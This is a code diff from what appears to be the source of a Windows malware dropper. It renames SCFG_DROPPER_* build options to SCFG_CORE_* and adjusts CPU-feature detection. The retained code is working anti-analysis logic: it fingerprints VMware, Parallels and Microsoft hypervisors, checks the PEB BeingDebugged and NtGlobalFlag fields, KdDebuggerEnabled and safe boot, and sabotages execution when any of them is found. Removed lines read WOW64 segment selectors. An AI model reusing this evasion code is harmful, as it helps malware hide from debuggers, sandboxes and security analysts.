@@ -1,18 +1,23 @@
-#include <core\config.h>
+#include <config.h>
 
 CONFIG Config = {
-    RTLP_LCG_DWORD, // Features
-    RTLP_LCG_DWORD, // Cpu
-    RTLP_LCG_DWORD, // HyperVisor
-    RTLP_LCG_DWORD, // NtVersion
-    RTLP_LCG_DWORD, // NtVersion
-    RTLP_LCG_DWORD, // NtVersion
-    RTLP_LCG_DWORD, // NtVersion
-    RTLP_LCG_DWORD, // NtVersion
-    RTLP_LCG_DWORD  // Os
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD,
+    RTLP_LCG_DWORD
 };
 
-#if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF || SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+#if SCFG_CORE_IGNORE_HARDWARE_DBG == OFF || SCFG_CORE_IGNORE_SOFTWARE_DBG == OFF
     static
     VOID
     FORCEINLINE
@@ -32,6 +37,7 @@ ConfigIsProcessorCompatible(VOID)
     enum {
         /* ECX */
         CPUID_00000001_HV     = (1 << 31),
+        CPUID_00000001_AES    = (1 << 25),
         CPUID_00000001_SSE4_2 = (1 << 20),
         CPUID_00000001_SSE4_1 = (1 << 19),
         CPUID_00000001_SSE3   = (1 <<  0),
@@ -62,11 +68,11 @@ ConfigIsProcessorCompatible(VOID)
         }
     };
 
-    /* CMOVcc instructions */
-    Config.Features.bSSE3 = (dwEcx & CPUID_00000001_SSE3  ) ? TRUE : FALSE;
-    Config.Features.bSSE4 = (dwEcx & CPUID_00000001_SSE4_1) ? TRUE : FALSE;
-    Config.Features.bSSE5 = (dwEcx & CPUID_00000001_SSE4_2) ? TRUE : FALSE;
-    Config.Features.bHV   = (dwEcx & CPUID_00000001_HV    ) ? TRUE : FALSE;
+    Config.Features.bHV   = dwEcx & CPUID_00000001_HV;
+    Config.Features.bAES  = dwEcx & CPUID_00000001_AES;
+    Config.Features.bSSE5 = dwEcx & CPUID_00000001_SSE4_2;
+    Config.Features.bSSE4 = dwEcx & CPUID_00000001_SSE4_1;
+    Config.Features.bSSE3 = dwEcx & CPUID_00000001_SSE3;
 
     #ifdef DEBUG_LEVEL >= DEBUG_LEVEL_INFORMATIVE
         if (Config.Features.bHV) {
@@ -95,12 +101,11 @@ ConfigIsProcessorCompatible(VOID)
 
     Config.Cpu.bIntel      = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorIntel)) == 0xFFFF ? TRUE : FALSE;
     Config.Cpu.bAmd        = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorAmd))   == 0xFFFF ? TRUE : FALSE;
-    Config.Cpu.bUnderWow64 = RtlpIsProcessRunningUnderWow64()                                      ? TRUE : FALSE;
+    Config.Cpu.bUnderWow64 = RtlpIsProcessRunningUnderWow64();
 
     $DLOG3(DLG_FLT_DEFAULT, "Config.Cpu.bIntel      = %u", Config.Cpu.bIntel);
     $DLOG3(DLG_FLT_DEFAULT, "Config.Cpu.bAmd        = %u", Config.Cpu.bAmd);
     $DLOG3(DLG_FLT_DEFAULT, "Config.Cpu.bUnderWow64 = %u", Config.Cpu.bUnderWow64);
-
     $DLOG2(DLG_FLT_INFO, "Done");
 
     return TRUE;
@@ -178,9 +183,9 @@ ConfigIsHyperVisorSupported(VOID)
     Config.HyperVisor.bPadding   = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorPadding  )) == 0xFFFF ? TRUE : FALSE;
     Config.HyperVisor.bParallels = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorParallels)) == 0xFFFF ? TRUE : FALSE;
 
-    $DLOG3(DLG_FLT_DEFAULT, "Config.HyperVisor.bMicrosoft = %u", Config.HyperVisor.bMicrosoft);
-    $DLOG3(DLG_FLT_DEFAULT, "Config.HyperVisor.bVmware    = %u", Config.HyperVisor.bVmware);
-    $DLOG3(DLG_FLT_DEFAULT, "Config.HyperVisor.bParallels = %u", Config.HyperVisor.bParallels);
+    $DLOG3(DLG_FLT_DEFAULT, "Config.HyperVisor.bMicrosoft = %lX", Config.HyperVisor.bMicrosoft);
+    $DLOG3(DLG_FLT_DEFAULT, "Config.HyperVisor.bVmware    = %lX", Config.HyperVisor.bVmware);
+    $DLOG3(DLG_FLT_DEFAULT, "Config.HyperVisor.bParallels = %lX", Config.HyperVisor.bParallels);
 
     #ifdef DEBUG_LEVEL >= DEBUG_LEVEL_CASUAL
         if (Config.HyperVisor.bEnabled != 0x00000001) {
@@ -192,7 +197,7 @@ ConfigIsHyperVisorSupported(VOID)
 
     #undef CBC_VENDOR
 
-    #if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF
+    #if SCFG_CORE_IGNORE_HARDWARE_DBG == OFF
         if (Config.HyperVisor.bEnabled != 0x00000001) {
             TrashReturnValue();
 
@@ -287,7 +292,7 @@ ConfigIsWindowsSupported(VOID)
         if (Peb->BeingDebugged) {
             $DLOG2(DLG_FLT_CRITICAL, "Peb32.BeingDebugged is enabled!");
 
-            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+            #if SCFG_CORE_IGNORE_SOFTWARE_DBG == OFF
                 bRval = FALSE;
                 TrashReturnValue();
             #endif
@@ -296,7 +301,7 @@ ConfigIsWindowsSupported(VOID)
         if (Peb->NtGlobalFlag & NtGlobalInvalidFlags) {
             $DLOG2(DLG_FLT_CRITICAL, "Peb32.NtGlobalFlag contains unwanted debug flags");
 
-            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+            #if SCFG_CORE_IGNORE_SOFTWARE_DBG == OFF
                 bRval = FALSE;
                 TrashReturnValue();
             #endif
@@ -309,7 +314,7 @@ ConfigIsWindowsSupported(VOID)
         if (Peb->BeingDebugged) {
             $DLOG2(DLG_FLT_CRITICAL, "Peb64.BeingDebugged is enabled!");
 
-            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+            #if SCFG_CORE_IGNORE_SOFTWARE_DBG == OFF
                 bRval = FALSE;
                 TrashReturnValue();
             #endif
@@ -318,7 +323,7 @@ ConfigIsWindowsSupported(VOID)
         if (Peb->NtGlobalFlag & NtGlobalInvalidFlags) {
             $DLOG2(DLG_FLT_CRITICAL, "Peb64.NtGlobalFlag contains unwanted debug flags");
 
-            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
+            #if SCFG_CORE_IGNORE_SOFTWARE_DBG == OFF
                 bRval = FALSE;
                 TrashReturnValue();
             #endif
@@ -330,7 +335,7 @@ ConfigIsWindowsSupported(VOID)
     if (UserShared->SafeBootMode) {
         $DLOG2(DLG_FLT_CRITICAL, "UserShared.SafeBootMode is enabled!");
 
-        #if SCFG_DROPPER_IGNORE_SAFEBOOT == OFF
+        #if SCFG_CORE_IGNORE_SAFEBOOT == OFF
             bRval = FALSE;
         #endif
     }
@@ -338,22 +343,10 @@ ConfigIsWindowsSupported(VOID)
     if (UserShared->KdDebuggerEnabled) {
         $DLOG2(DLG_FLT_CRITICAL, "UserShared.KdDebuggerEnabled is enabled!");
 
-        #if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF
+        #if SCFG_CORE_IGNORE_HARDWARE_DBG == OFF
             bRval = FALSE;
             TrashReturnValue();
         #endif
-    }
-
-    if (Config.Cpu.bUnderWow64) {
-        Config.Os.wLongModeSelector   = *(PWORD )((ULONG_PTR)Teb->WOW32Reserved + 5);
-
-        __asm {
-            mov ax, cs
-            mov word ptr [Config.Os.wLegacyModeSelector], ax
-        };
-
-        $DLOG2(DLG_FLT_DEFAULT, "Config.Os.wLongModeSelector   = 0x%04X", Config.Os.wLongModeSelector);
-        $DLOG2(DLG_FLT_DEFAULT, "Config.Os.wLegacyModeSelector = 0x%04X", Config.Os.wLegacyModeSelector);
     }
 
     $DLOG2(DLG_FLT_INFO, "Done");
